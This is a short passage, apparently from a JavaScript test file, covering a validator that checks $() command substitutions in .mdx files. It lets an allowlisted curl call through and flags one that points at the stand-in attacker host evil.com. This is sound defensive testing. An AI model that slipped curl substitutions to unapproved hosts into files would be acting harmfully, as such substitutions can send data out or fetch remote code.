  assert.match(errors[0], /evil\.com/);
});

test("validateCommandSubstitutions: allows allowlisted curl inside $()", () => {
  const errors = [];
  validateCommandSubstitutions(
    "$(curl https://api.usewraith.xyz/agent/info/payments)",
    "file.mdx:1",
    errors,
  );
  assert.equal(errors.length, 0);
});
